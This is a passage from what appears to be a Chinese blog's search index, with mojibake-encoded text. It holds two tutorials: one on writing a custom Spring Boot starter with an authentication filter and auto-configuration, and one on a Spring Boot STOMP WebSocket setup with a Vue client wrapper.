com.xianwt.cloud.cep.impl.SpecialFilterCepImpl;\nimport com.xianwt.cloud.filter.AuthenticationFilter;\nimport com.xianwt.cloud.server.AuthenticationServerSource;\nimport com.xianwt.cloud.server.AuthorizationServerSource;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.EnableAutoConfiguration;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnBean;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnClass;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.annotation.Resource;\n\n@Configuration\n@EnableConfigurationProperties({AuthenticationProperties.class})\npublic class AuthenticationConfiguration {\n\n    private static final Log log = LogFactory.getLog(AuthenticationFilter.class);\n\n    @Autowired\n    private AuthenticationProperties authenticationProperties;\n\n\n    public ProjectUrlFilterCep projectUrlFilterCep(){\n        return new ProjectUrlFilterCepImpl(authenticationProperties);\n    }\n\n    public SpecialFilterCep specialFilterCep(){\n        return new SpecialFilterCepImpl(authenticationProperties);\n    }\n\n    @Bean\n    public AuthenticationCep authenticationCep(AuthenticationServerSource authenticationServerSource){\n        AuthenticationCepImpl authenticationCep = new AuthenticationCepImpl(authenticationProperties,authenticationServerSource);\n        return authenticationCep;\n    }\n\n    @Bean\n    public AuthorizationCep authorizationCep(AuthorizationServerSource authorizationServerSource){\n        AuthorizationCepImpl authenticationCep = new AuthorizationCepImpl(authenticationProperties,authorizationServerSource);\n        return authenticationCep;\n    }\n\n\n    @Bean\n    public FilterRegistrationBean<AuthenticationFilter> testFilterRegistration(AuthenticationCep authenticationCep,AuthorizationCep authorizationCep) {\n        FilterRegistrationBean<AuthenticationFilter> registration = new FilterRegistrationBean<>();\n        AuthenticationFilter authenticationFilter = AuthenticationFilter.builder()\n                .authenticationProperties(authenticationProperties)\n                .specialFilterCep(specialFilterCep())\n                .projectUrlFilterCep(projectUrlFilterCep())\n                .authenticationCep(authenticationCep)\n                .authorizationCep(authorizationCep)\n                .build();\n        registration.setFilter(authenticationFilter);\n        //éç½®è¿æ»¤è·¯å¾\n        registration.addUrlPatterns("/*");\n        //è®¾ç½®filteråç§°\n        registration.setName("authenticationFilter");\n        //è¯·æ±ä¸­è¿æ»¤å¨æ§è¡çååé¡ºåºï¼å¼è¶å°è¶åæ§è¡\n        registration.setOrder(1);\n        return registration;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\næä¸»è¦å¾å°±æ¯æ³¨è§£ï¼è³äºä¸å¡é»è¾å¤§å®¶é½æ¯åèªå·±å¾ã\n\n\n# åãæå®å è½½æä»¶è·¯å¾\n\nå¨ resources ç®å½ä¸æ°å»º META-INF æä»¶å¤¹ï¼å¨ META-INF æä»¶å¤¹ä¸å¨æ°å»º spring.factories æä»¶ï¼ä¸å¨ææ·»å ä»¥ä¸åå®¹\n\n# Auto Configure\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=com.xianwt.cloud.properties.AuthenticationConfiguration\n\n\n1\n2\n\n\nä¸åºé®é¢å¤§å®¶åå¸åï¼å¨å«çé¡¹ç®ä¾èµèªå·±ç jar å°±å¯ä»¥äºãä½é¤äº EnableAutoConfiguration å¤è¿æå¶ä»çä¸äºç±»å¯ä»¥å±æä»¬ä½¿ç¨ï¼\n\n * EnableAutoConfigurationï¼æå®èªå¨éç½®ç±»ï¼å¯å¨ä¼æ§è¡æå®çç±»ã\n * ApplicationContextInitializerï¼åå§ååºç¨ç¨åºä¸ä¸æçåè°æ¥å£ï¼å¯ä»¥å¸®å©æä»¬æ¿å° applicationContextã\n * ApplicationListenerï¼çå¬åºç¨ç¨åºäºä»¶çåè°æ¥å£ï¼è¿éå¯ä»¥çå¬ ContextRefreshedEvent å½åºç¨ç¨åºä¸ä¸æè¢«åå§åæå·æ°æ¶è§¦åï¼ApplicationStartedEvent å½ Spring åºç¨ç¨åºä¸ä¸æåå¤å®æ¯åï¼ä½å°æªè¿è¡æ¶è§¦åï¼ApplicationReadyEvent å½åºç¨ç¨åºå·²ç»å¯å¨å¹¶åå¤å¥½æå¡è¯·æ±æ¶è§¦åï¼ContextClosedEvent å½åºç¨ç¨åºä¸ä¸æå³é­æ¶è§¦åï¼ä¹å¯ä»¥è§¦åæä»¬çèªå®ä¹äºä»¶ã\n * ConditionContributorï¼ä¸ºèªå¨éç½®æä¾é¢å¤çæ¡ä»¶ï¼å¯ä»¥ç¨ @ConditionalOnProperty æ¥ä»£æ¿ã\n * TemplateAvailabilityProviderï¼å¨è¿è¡æ¶æ£æ¥å¯ç¨æ¨¡æ¿çç­ç¥æ¥å£ï¼ä½¿ç¨å®ä»¬æ¥ç¡®å®æ¯å¦å­å¨æ­£ç¡®çæ¨¡æ¿æä»¶ã\n\n\n# äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£\n\n@ConditionalOnBean å¨å½åä¸ä¸æä¸­å­å¨æä¸ªå¯¹è±¡æ¶ï¼æä¼å®ä¾åä¸ä¸ª Bean\n@ConditionalOnMissingBean å¨å½åä¸ä¸æä¸­ä¸å­å¨æä¸ªå¯¹è±¡æ¶ï¼æä¼å®ä¾åä¸ä¸ª Bean\n@Conditiona lOnClass è¡¨ç¤ºå½ class path ææå®çç±»æ¶ï¼éç½®çæã\n@ConditionalOnMissingClass è¡¨ç¤ºå½ classpath ä¸­æ²¡ææå®çç±»çæ¶åï¼éç½®çæã\n@ConditionalOnProperty æ³¨è§£æ ¹æ® name æ¥è¯»å Spring Boot ç Environment ç åéåå«çå±æ§ï¼æ ¹æ®å¶å¼ä¸ havingValue çå¼æ¯è¾ç»æå³å®éç½®æ¯å¦çæãå¦ææ²¡ææå® havingValue ï¼åªè¦å±æ§ä¸ä¸º false ï¼éç½®é½è½çæãmatcblfMissing ä¸ºä¾ æå³çå¦æ Environment æ²¡æåå« âmessage.center.enabledâï¼éç½®ä¹è½çæï¼é»è®¤ä¸º falseã\n@ConditionalOnExpression ï¼å½è¡¨è¾¾å¼ä¸º true æ¶ï¼æä¼å®ä¾åä¸ä¸ª Bean ï¼æ¯æ SpEL è¡¨è¾¾å¼ï¼æ¯å¦æ ¹æ®éç½®æä»¶ä¸­çæä¸ªå¼æ¥å³å®éç½®æ¯å¦çæã\n@ConditionalOnJava ï¼å½å­å¨æå®ç Java çæ¬çæ¶åã\n\n\n# å­ãåçº§å° SpringBoot3 ä½¿ç¨ starter\n\nå¨ SpringBoot2.7 å°±å·²ç»è¯´æå»ºè®®ä½¿ç¨ META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports çæ¹å¼ä½ä¸ºå®ä¹èªå¨è£éæä»¶ä½ç½®ãèå¨ 3.0 çæ¬ï¼å·²ç»æ¯ç§»é¤äº META-INF/spring.factoriesï¼æä»¥æä»¬ç»§ç»­éè¿ META-INF/spring.factories æä»¶å®ä¹å°ä¸å¨çæã\n\n\x3c!-- æ·»å ä¾èµ --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-autoconfigure</artifactId>\n</dependency>\n\n\x3c!-- å¯¹ @ConfigurationProperties çå¤ç --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n@AutoConfiguration\n@EnableConfigurationProperties(value = TestProperties.class)\npublic class TestAutoConfiguration {\n\n    @Bean\n    public TestTemplate testTemplate(){\n        return new TestTemplate ();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@AutoConfiguration æ¯ spring boot2.7 æ°å¼å¥çï¼èªå¨éç½®ç±»å¿é¡»æ¾è¿ä¸é¢çæä»¶éæç®èªå¨éç½®ç±»\n\nå¨ META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports æä»¶éé¢æ·»å \n\ncom.spring.demo.test.TestAutoConfiguration\n\n\n1\n',normalizedContent:'spring boot starter æ¯ä¸ç»å¯éç¨çä¾èµåºï¼å®ä»¬æä¾äºä¸ç§å¿«éå¯å¨ spring boot åºç¨ç¨åºçæ¹å¼ãæ¯ä¸ª starter é½åå«äºä¸ç»é¢éç½®çä¾èµé¡¹åèªå¨éç½®ç±»ï¼ä½¿å¾ä½¿ç¨èå¯ä»¥è½»æ¾å°éæåç§ä¸åçåè½æ¨¡åï¼èæ éæå¨éç½®å¤§éçä¾èµé¡¹ååæ°ãè¿æ ·ï¼å¼åäººåå¯ä»¥æ´å ä¸æ³¨äºä¸å¡é»è¾çå®ç°ï¼èä¸éè¦å³å¿åºå±çéç½®åéæç»èã\n\nspring boot starter çæä¹å¨äºåå°äºåºç¨ç¨åºçå¼åææ¬åå¤æåº¦ï¼æé«äºå¼åæçåä»£ç è´¨éï¼å¹¶ä¸æ¯ææ´å¿«çè¿­ä»£åé¨ç½²ãå¦å¤ï¼ç¤¾åºä¹æä¾äºå¾å¤å¸¸ç¨ç starterï¼å¦æ°æ®åºãweb æ¡æ¶ãå®å¨æ¡æ¶ç­ï¼å¯ä»¥ç´æ¥ä½¿ç¨ï¼ä¹å¯ä»¥éè¿å®å¶æ¥æ»¡è¶³å·ä½çéæ±ã\n\n\n# ä¸ãstarter ä¾èµ\n\næ°å»ºä¸ä¸ª spring boot å·¥ç¨ã\n\n\x3c!-- åå«äºlog ä»¥å autoconfigure ç­ --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter</artifactid>\n</dependency>\n\n\x3c!-- å¯¹ @configurationproperties çå¤ç --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# äºãæ·»å éç½®ç±»\n\npackage com.xianwt.cloud.properties;\n\nimport lombok.data;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.stereotype.component;\n\nimport java.util.list;\n\n/**\n * @author big uncle\n * @date 2019/11/27 9:27\n **/\n@configurationproperties(prefix = "security.authentication")\n@data\npublic class authenticationproperties {\n\n    /**\n     * token\n    **/\n    private string usertoken = "user:token:";\n    /**\n     * æ¦æª\n    **/\n    private string authorization = "authorization";\n    /**\n     * é»è®¤åæ°ç¨æ·\n     **/\n    private string userkey = "default:user:";\n    /**\n     * æé\n    **/\n    private string authoritykey = "user:authority:";\n    /**\n     * ç¨æ·è®¿é®èµæºé é»è®¤ä¸æ¦æª\n    **/\n    private boolean authoritylock = false;\n    /**\n     * é¡¹ç®è¿æ»¤éå, ä»¥éå·åå²\n    **/\n    private list<string> projecturl;\n    /**\n     * ç¹æ®è·¯å¾æ¾å¼æ¦æªï¼èµ°é requestdata æ¹å¼\n     **/\n    private list<string> specialurl;\n    /**\n     * å¤±è´¥å¤çå¨\n    **/\n    private string failureurl = "/failure/authenticationfilter";\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# æ·»å å è½½ç±»\n\npackage com.xianwt.cloud.properties;\n\n/**\n * @author big uncle\n * @date 2020/3/29 10:58\n * @module\n **/\n\nimport com.xianwt.cloud.cep.authenticationcep;\nimport com.xianwt.cloud.cep.authorizationcep;\nimport com.xianwt.cloud.cep.projecturlfiltercep;\nimport com.xianwt.cloud.cep.specialfiltercep;\nimport com.xianwt.cloud.cep.impl.authenticationcepimpl;\nimport com.xianwt.cloud.cep.impl.authorizationcepimpl;\nimport com.xianwt.cloud.cep.impl.projecturlfiltercepimpl;\nimport com.xianwt.cloud.cep.impl.specialfiltercepimpl;\nimport com.xianwt.cloud.filter.authenticationfilter;\nimport com.xianwt.cloud.server.authenticationserversource;\nimport com.xianwt.cloud.server.authorizationserversource;\nimport lombok.extern.slf4j.slf4j;\nimport org.apache.commons.logging.log;\nimport org.apache.commons.logging.logfactory;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.enableautoconfiguration;\nimport org.springframework.boot.autoconfigure.condition.conditionalonbean;\nimport org.springframework.boot.autoconfigure.condition.conditionalonclass;\nimport org.springframework.boot.autoconfigure.condition.conditionalonproperty;\nimport org.springframework.boot.context.properties.enableconfigurationproperties;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.annotation.resource;\n\n@configuration\n@enableconfigurationproperties({authenticationproperties.class})\npublic class authenticationconfiguration {\n\n    private static final log log = logfactory.getlog(authenticationfilter.class);\n\n    @autowired\n    private authenticationproperties authenticationproperties;\n\n\n    public projecturlfiltercep projecturlfiltercep(){\n        return new projecturlfiltercepimpl(authenticationproperties);\n    }\n\n    public specialfiltercep specialfiltercep(){\n        return new specialfiltercepimpl(authenticationproperties);\n    }\n\n    @bean\n    public authenticationcep authenticationcep(authenticationserversource authenticationserversource){\n        authenticationcepimpl authenticationcep = new authenticationcepimpl(authenticationproperties,authenticationserversource);\n        return authenticationcep;\n    }\n\n    @bean\n    public authorizationcep authorizationcep(authorizationserversource authorizationserversource){\n        authorizationcepimpl authenticationcep = new authorizationcepimpl(authenticationproperties,authorizationserversource);\n        return authenticationcep;\n    }\n\n\n    @bean\n    public filterregistrationbean<authenticationfilter> testfilterregistration(authenticationcep authenticationcep,authorizationcep authorizationcep) {\n        filterregistrationbean<authenticationfilter> registration = new filterregistrationbean<>();\n        authenticationfilter authenticationfilter = authenticationfilter.builder()\n                .authenticationproperties(authenticationproperties)\n                .specialfiltercep(specialfiltercep())\n                .projecturlfiltercep(projecturlfiltercep())\n                .authenticationcep(authenticationcep)\n                .authorizationcep(authorizationcep)\n                .build();\n        registration.setfilter(authenticationfilter);\n        //éç½®è¿æ»¤è·¯å¾\n        registration.addurlpatterns("/*");\n        //è®¾ç½®filteråç§°\n        registration.setname("authenticationfilter");\n        //è¯·æ±ä¸­è¿æ»¤å¨æ§è¡çååé¡ºåºï¼å¼è¶å°è¶åæ§è¡\n        registration.setorder(1);\n        return registration;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\næä¸»è¦å¾å°±æ¯æ³¨è§£ï¼è³äºä¸å¡é»è¾å¤§å®¶é½æ¯åèªå·±å¾ã\n\n\n# åãæå®å è½½æä»¶è·¯å¾\n\nå¨ resources ç®å½ä¸æ°å»º meta-inf æä»¶å¤¹ï¼å¨ meta-inf æä»¶å¤¹ä¸å¨æ°å»º spring.factories æä»¶ï¼ä¸å¨ææ·»å ä»¥ä¸åå®¹\n\n# auto configure\norg.springframework.boot.autoconfigure.enableautoconfiguration=com.xianwt.cloud.properties.authenticationconfiguration\n\n\n1\n2\n\n\nä¸åºé®é¢å¤§å®¶åå¸åï¼å¨å«çé¡¹ç®ä¾èµèªå·±ç jar å°±å¯ä»¥äºãä½é¤äº enableautoconfiguration å¤è¿æå¶ä»çä¸äºç±»å¯ä»¥å±æä»¬ä½¿ç¨ï¼\n\n * enableautoconfigurationï¼æå®èªå¨éç½®ç±»ï¼å¯å¨ä¼æ§è¡æå®çç±»ã\n * applicationcontextinitializerï¼åå§ååºç¨ç¨åºä¸ä¸æçåè°æ¥å£ï¼å¯ä»¥å¸®å©æä»¬æ¿å° applicationcontextã\n * applicationlistenerï¼çå¬åºç¨ç¨åºäºä»¶çåè°æ¥å£ï¼è¿éå¯ä»¥çå¬ contextrefreshedevent å½åºç¨ç¨åºä¸ä¸æè¢«åå§åæå·æ°æ¶è§¦åï¼applicationstartedevent å½ spring åºç¨ç¨åºä¸ä¸æåå¤å®æ¯åï¼ä½å°æªè¿è¡æ¶è§¦åï¼applicationreadyevent å½åºç¨ç¨åºå·²ç»å¯å¨å¹¶åå¤å¥½æå¡è¯·æ±æ¶è§¦åï¼contextclosedevent å½åºç¨ç¨åºä¸ä¸æå³é­æ¶è§¦åï¼ä¹å¯ä»¥è§¦åæä»¬çèªå®ä¹äºä»¶ã\n * conditioncontributorï¼ä¸ºèªå¨éç½®æä¾é¢å¤çæ¡ä»¶ï¼å¯ä»¥ç¨ @conditionalonproperty æ¥ä»£æ¿ã\n * templateavailabilityproviderï¼å¨è¿è¡æ¶æ£æ¥å¯ç¨æ¨¡æ¿çç­ç¥æ¥å£ï¼ä½¿ç¨å®ä»¬æ¥ç¡®å®æ¯å¦å­å¨æ­£ç¡®çæ¨¡æ¿æä»¶ã\n\n\n# äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£\n\n@conditionalonbean å¨å½åä¸ä¸æä¸­å­å¨æä¸ªå¯¹è±¡æ¶ï¼æä¼å®ä¾åä¸ä¸ª bean\n@conditionalonmissingbean å¨å½åä¸ä¸æä¸­ä¸å­å¨æä¸ªå¯¹è±¡æ¶ï¼æä¼å®ä¾åä¸ä¸ª bean\n@conditiona lonclass è¡¨ç¤ºå½ class path ææå®çç±»æ¶ï¼éç½®çæã\n@conditionalonmissingclass è¡¨ç¤ºå½ classpath ä¸­æ²¡ææå®çç±»çæ¶åï¼éç½®çæã\n@conditionalonproperty æ³¨è§£æ ¹æ® name æ¥è¯»å spring boot ç environment ç åéåå«çå±æ§ï¼æ ¹æ®å¶å¼ä¸ havingvalue çå¼æ¯è¾ç»æå³å®éç½®æ¯å¦çæãå¦ææ²¡ææå® havingvalue ï¼åªè¦å±æ§ä¸ä¸º false ï¼éç½®é½è½çæãmatcblfmissing ä¸ºä¾ æå³çå¦æ environment æ²¡æåå« âmessage.center.enabledâï¼éç½®ä¹è½çæï¼é»è®¤ä¸º falseã\n@conditionalonexpression ï¼å½è¡¨è¾¾å¼ä¸º true æ¶ï¼æä¼å®ä¾åä¸ä¸ª bean ï¼æ¯æ spel è¡¨è¾¾å¼ï¼æ¯å¦æ ¹æ®éç½®æä»¶ä¸­çæä¸ªå¼æ¥å³å®éç½®æ¯å¦çæã\n@conditionalonjava ï¼å½å­å¨æå®ç java çæ¬çæ¶åã\n\n\n# å­ãåçº§å° springboot3 ä½¿ç¨ starter\n\nå¨ springboot2.7 å°±å·²ç»è¯´æå»ºè®®ä½¿ç¨ meta-inf/spring/org.springframework.boot.autoconfigure.autoconfiguration.imports çæ¹å¼ä½ä¸ºå®ä¹èªå¨è£éæä»¶ä½ç½®ãèå¨ 3.0 çæ¬ï¼å·²ç»æ¯ç§»é¤äº meta-inf/spring.factoriesï¼æä»¥æä»¬ç»§ç»­éè¿ meta-inf/spring.factories æä»¶å®ä¹å°ä¸å¨çæã\n\n\x3c!-- æ·»å ä¾èµ --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-autoconfigure</artifactid>\n</dependency>\n\n\x3c!-- å¯¹ @configurationproperties çå¤ç --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n@autoconfiguration\n@enableconfigurationproperties(value = testproperties.class)\npublic class testautoconfiguration {\n\n    @bean\n    public testtemplate testtemplate(){\n        return new testtemplate ();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@autoconfiguration æ¯ spring boot2.7 æ°å¼å¥çï¼èªå¨éç½®ç±»å¿é¡»æ¾è¿ä¸é¢çæä»¶éæç®èªå¨éç½®ç±»\n\nå¨ meta-inf/spring/org.springframework.boot.autoconfigure.autoconfiguration.imports æä»¶éé¢æ·»å \n\ncom.spring.demo.test.testautoconfiguration\n\n\n1\n',charsets:{cjk:!0}},{title:"SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®",frontmatter:{title:"SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/202/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/202.SpringBoot%20%E4%B9%8B%20Stomp%20%E4%BD%BF%E7%94%A8%E5%92%8C%20vue%20%E7%9B%B8%E9%85%8D%E7%BD%AE.html",relativePath:"01.æ¡æ¶/01.Spring/03.spring boot/202.SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®.md",key:"v-1527c6e0",path:"/spring/spring-boot/202/",headers:[{level:2,title:"åç«¯ä»£ç ",slug:"åç«¯ä»£ç ",normalizedTitle:"åç«¯ä»£ç ",charIndex:2},{level:2,title:"åç«¯ä»£ç ",slug:"åç«¯ä»£ç ",normalizedTitle:"åç«¯ä»£ç ",charIndex:2352}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"åç«¯ä»£ç  åç«¯ä»£ç ",content:'# åç«¯ä»£ç \n\nä¾èµ\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-websocket</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.messaging.simp.config.MessageBrokerRegistry;\nimport org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;\nimport org.springframework.web.socket.config.annotation.StompEndpointRegistry;\nimport org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer;\n\n/**\n * éè¿EnableWebSocketMessageBroker å¼å¯ä½¿ç¨STOMPåè®®æ¥ä¼ è¾åºäºä»£ç(message broker)çæ¶æ¯,æ­¤æ¶æµè§å¨æ¯æä½¿ç¨@MessageMapping å°±åæ¯æ@RequestMappingä¸æ ·ã\n * @author zhenghuasheng\n */\n@Configuration\n@EnableWebSocketMessageBroker\npublic class WebSocketConfig implements WebSocketMessageBrokerConfigurer {\n\n    /**\n     * æ³¨åstompçç«¯ç¹\n     */\n    @Override\n    public void registerStompEndpoints(StompEndpointRegistry registry) {\n        // ç¨æ·è®¢éä¸»é¢çåç¼ /topic ä»£è¡¨åå¸å¹¿æ­ï¼å³ç¾¤å /queue ä»£è¡¨ç¹å¯¹ç¹ï¼å³åæå®ç¨æ·\n        registry.addEndpoint("/webSocket")\n                // è®¾ç½®è·¨å\n                .setAllowedOrigins("*")\n                //æ·»å socketæ¦æªå¨ï¼ç¨äºä»è¯·æ±ä¸­è·åå®¢æ·ç«¯æ è¯åæ° ç®åæ²¡ä»ä¹ç¨ï¼å¯ä»¥å»æ\n                .addInterceptors(new MyHandShakeInterceptor())\n                .withSockJS();\n    }\n\n    /**\n     * éç½®æ¶æ¯ä»£ç(message broker)\n     * @param registry\n     */\n    @Override\n    public void configureMessageBroker(MessageBrokerRegistry registry) {\n//        ThreadPoolTaskScheduler te = new ThreadPoolTaskScheduler();\n//        te.setPoolSize(1);\n//        te.setThreadNamePrefix("wss-heartbeat-thread-");\n//        te.initialize();\n        // ä»£çç¨ä¸å°\n//        registry.enableStompBrokerRelay().setClientLogin("111").setClientPasscode("111").setRelayPort(8005);\n        // è®¢éBrokeråç§°\n        registry.enableSimpleBroker("/queue","/topic")\n                // ç¬¬ä¸ä¸ªåæ°è¡¨ç¤ºæå¡å¨åå¥æåéå¿è·³çé¢çã ç¬¬äºä¸ªåæ°è¡¨ç¤ºå®¢æ·ç«¯åéå¿è·³æ¶é´\n//                .setHeartbeatValue(new long[]{15000,3000})\n//                .setTaskScheduler(te)\n        ;\n        // å¨å±ä½¿ç¨çæ¶æ¯åç¼ï¼å®¢æ·ç«¯è®¢éè·¯å¾ä¸ä¼ä½ç°åºæ¥ï¼\n//        registry.setApplicationDestinationPrefixes("/app");\n        // ç¹å¯¹ç¹ä½¿ç¨çè®¢éåç¼ï¼å®¢æ·ç«¯è®¢éè·¯å¾ä¸ä¼ä½ç°åºæ¥ï¼ï¼ä¸è®¾ç½®çè¯ï¼é»è®¤ä¹æ¯/user/\n        // registry.setUserDestinationPrefix("/user/");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# åç«¯ä»£ç \n\nä¾èµ\n\nnpm install sockjs-client\nnpm install stompjs\nnpm install net\nnpm install vue-stomp\n\n\n1\n2\n3\n4\n\n\nå°è£ stomp.js\n\nimport SockJS from \'sockjs-client\'\nimport Stomp from \'webstomp-client\'\n\nexport default {\n  // æ¯å¦å¯ç¨æ¥å¿ é»è®¤å¯ç¨\n  debug:true,\n  // å®¢æ·ç«¯è¿æ¥ä¿¡æ¯\n  stompClient:{},\n  // åå§å\n  init(callBack){\n    const socket = new SockJS(\'http://127.0.0.1:8005/webSocket\')\n    this.stompClient = Stomp.over(socket)\n    this.stompClient.hasDebug = this.debug\n    this.stompClient.connect({},suce =>{\n      this.console("è¿æ¥æå,ä¿¡æ¯å¦ä¸ â");\n      this.console(this.stompClient);\n      if(callBack){\n        callBack();\n      }\n    },err => {\n      if(err) {\n        this.console("è¿æ¥å¤±è´¥,ä¿¡æ¯å¦ä¸ â")\n        this.console(err)\n      }\n    });\n  },\n  // è®¢é\n  sub(address,callBack){\n    if(!this.stompClient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³è®¢é");\n      return;\n    }\n    // çæ id\n    let timestamp= new Date().getTime() + address\n    this.console("è®¢éæå -> "+address)\n    this.stompClient.subscribe(address,message => {\n      this.console(address+" è®¢éæ¶æ¯éç¥,ä¿¡æ¯å¦ä¸ â")\n      this.console(message)\n      let data = message.body;\n      callBack(data);\n    },{\n      id: timestamp\n    })\n  },\n  unSub(address){\n    if(!this.stompClient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³åæ¶è®¢é -> "+address);\n      return;\n    }\n    let id = ""\n    for(let item in this.stompClient.subscriptions){\n      if(item.endsWith(address)){\n        id = item;\n        break;\n      }\n    }\n    this.stompClient.unsubscribe(id);\n    this.console("åæ¶è®¢éæå -> id:"+ id + " address:"+address)\n  },\n  // æ­å¼è¿æ¥\n  disconnect(callBack){\n    if(!this.stompClient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³æ­å¼è¿æ¥");\n      return;\n    }\n    this.stompClient.disconnect(() =>{\n      console.log("æ­å¼æå")\n      if(callBack){\n        callBack()\n      }\n    });\n  },\n  // åä½ ç§\n  reconnect(time){\n    setInterval(() =>{\n      if(!this.stompClient.connected){\n        this.console("éæ°è¿æ¥ä¸­...")\n        this.init()\n      }\n    },time * 1000)\n  },\n  console(msg){\n    if(this.debug){\n      console.log(msg);\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\nä»¥ä¸æ¯æèªå·±å°è£çä¸ä¸ª stomp.jsï¼å»ºè®®å¨ç»å½ä¹åè°ç¨ initï¼å¹¶ä¸ä¿è¯ è®¢é å init ç­ææ API å¨ä¸ä¸ªæä»¶ä¸­ä½¿ç¨ï¼å¦åä¼ undefinedãå¯ä»¥ä½¿ç¨ eventBus æ¥ä¼ éæ°æ®ã\n\nå·ä½ä½¿ç¨\n\n  mounted() {\n    // åå§å\n    stomp.init(() =>{\n      // åå§åæå å°±æ§è¡è®¢é\n      stomp.sub("/topic",data =>{\n        console.log(data)\n      })\n      stomp.sub("/topic1",data =>{\n        console.log(data)\n      })\n      // åæ¶è®¢é\n      stomp.unSub("/topic")\n    })\n    //  å¯ç¨éè¿ 5ç§æ£æµä¸æ¬¡\n    stomp.reconnect(5)\n  },\n  destroyed() {\n    stomp.disconnect()\n  